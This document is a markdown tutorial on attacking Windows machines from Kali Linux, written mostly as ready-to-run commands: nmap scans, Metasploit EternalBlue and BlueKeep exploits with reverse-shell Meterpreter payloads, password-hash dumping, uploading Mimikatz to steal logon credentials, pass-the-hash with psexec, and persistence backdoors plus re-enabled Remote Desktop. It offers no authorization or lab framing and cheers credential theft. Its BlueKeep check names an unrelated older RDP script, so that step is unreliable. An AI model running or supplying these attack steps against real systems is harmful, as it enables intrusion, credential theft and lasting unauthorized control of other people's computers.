### ğŸ”¥ **Exploiting Windows Vulnerabilities Using Kali Linux (Full Guide)**
This guide walks you through **finding vulnerabilities** in a Windows system using **Kali Linux** and **exploiting them** with tools like **Metasploit**, **EternalBlue**, **Mimikatz**, and **Empire**.

---

## **ğŸ“Œ 1ï¸âƒ£ Find Vulnerabilities in Windows**
Before exploiting, you need to scan for open ports, services, and known vulnerabilities.

### âœ… **Scan for Open Ports (Nmap)**
```bash
nmap -sS -sV -O -T4 192.168.1.100
```
- `-sS` â†’ Stealth scan  
- `-sV` â†’ Detects versions  
- `-O` â†’ OS detection  
- `-T4` â†’ Fast scan  

#### **Common Windows Ports to Look For**
| **Port**  | **Service**   | **Vulnerability** |
|-----------|--------------|-------------------|
| 445       | SMB          | EternalBlue (MS17-010) |
| 3389      | RDP          | BlueKeep (CVE-2019-0708) |
| 135,139   | NetBIOS      | SMB vulnerabilities |
| 5985      | WinRM        | Pass-the-Hash attack |
| 1433      | MSSQL        | SQL Injection |

---

## **ğŸ“Œ 2ï¸âƒ£ Exploiting Windows Vulnerabilities**
### ğŸš€ **Option 1: Exploit SMB with EternalBlue (MS17-010)**
EternalBlue is a well-known Windows exploit.

#### **Step 1: Check for EternalBlue**
```bash
nmap --script=smb-vuln-ms17-010 -p 445 192.168.1.100
```
If it's **vulnerable**, proceed with the exploit.

#### **Step 2: Launch Metasploit**
```bash
msfconsole
```
Search for the exploit:
```bash
search ms17_010
```
Use the exploit:
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50  # Your Kali Linux IP
set LPORT 4444
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
```
ğŸ’¥ **Success!** You now have a **Meterpreter shell**.

#### **Step 3: Gain Full Control**
Inside **Meterpreter**, run:
```bash
sysinfo            # Get system info
getuid             # Check user privileges
hashdump          # Dump user password hashes
shell              # Get a full command prompt
```

---

### ğŸš€ **Option 2: Exploit Windows RDP with BlueKeep (CVE-2019-0708)**
If RDP (3389) is open, use BlueKeep.

#### **Step 1: Check for BlueKeep**
```bash
nmap -p 3389 --script rdp-vuln-ms12-020 192.168.1.100
```
#### **Step 2: Exploit Using Metasploit**
```bash
msfconsole
search bluekeep
use exploit/windows/rdp/cve_2019_0708_bluekeep
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
```

---

### ğŸš€ **Option 3: Exploit Weak Windows Passwords with Mimikatz**
Mimikatz extracts passwords from memory.

#### **Step 1: Upload Mimikatz to the Target**
```bash
upload /usr/share/windows-binaries/mimikatz.exe C:\\Windows\\Temp\\
```
#### **Step 2: Run Mimikatz**
```powershell
mimikatz.exe
sekurlsa::logonpasswords
```
âœ… **Steal user credentials!**  

---

### ğŸš€ **Option 4: Exploit Windows Admin with Pass-the-Hash**
If you got NTLM hashes from **Mimikatz**, use them.

#### **Step 1: Use psexec**
```bash
use exploit/windows/smb/psexec
set RHOST 192.168.1.100
set SMBUser Administrator
set SMBPass <HASH>
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
```
âœ… **Admin access without a password!**  

---

## **ğŸ“Œ 3ï¸âƒ£ Post-Exploitation (Maintaining Access)**
Once inside, **maintain persistence**:

### âœ… **Create a Backdoor**
```bash
meterpreter > run persistence -U -i 5 -p 4444 -r 192.168.1.50
```

### âœ… **Enable Remote Desktop for Future Access**
```powershell
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```
Then start RDP:
```powershell
net start termservice
```

---

## **ğŸ”¥ Conclusion**
You now know how to:
âœ… **Scan a Windows machine for vulnerabilities**  
âœ… **Exploit SMB, RDP, and weak passwords**  
âœ… **Use tools like Metasploit & Mimikatz**  
âœ… **Maintain persistence with backdoors**  
